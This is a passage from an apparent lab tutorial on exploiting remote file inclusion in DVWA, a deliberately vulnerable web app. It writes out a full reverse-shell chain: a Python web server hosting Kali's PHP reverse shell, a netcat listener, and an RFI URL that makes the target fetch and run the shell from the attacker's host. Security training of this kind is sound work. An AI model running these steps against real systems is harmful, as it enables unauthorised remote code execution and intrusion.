Remote File Inclusion

We already know we can point the page parameter to whatever we want, whether it's a local file or remote site. So can we point it to something that gives us a bit more control? A shell of some sort? Let's find out!

I tend to like reverse shells, so let's start by setting up a temporary web server on Kali. I don't know about you, but I don't want to deal with a full Apache server, .htaccess, moving files around, and all that. Lucky for us, we can easily stand one up with the following command:

python -m SimpleHTTPServer 9999



Of course, you can change 9999 to whatever port you want.

Now let's find a shell.

Kali actually has a bunch of them included by default. You can find them at /usr/share/webshells/. Since we're dealing with PHP, I'm going to take php/php-reverse-shell.php and move it to my working directory. Open it up and define the variable $ip to your Kali IP address and $port to whatever port you want to receive a connection to. It's that easy!

Finally, we'll need a listener to accept the connection from the shell. The networking tool "netcat" sounds like it will fit our needs. Let's try this:

nc -lvnp 5555



Again, feel free to change 5555 to your preferred port.

Now it's time to bring it all together. Your new RFI exploit should look something like:

http://dvwa/dvwa/vulnerabilities/fi/?page=http://[your_Kali_IP]:9999/php-reverse-shell.php

Let's try it out! Let's submit the URL and check our netcat listener.



At this point, it's game over. All we need to do is navigate to the fi.php file mentioned above and view the source code.



There's #3! We have all five quo
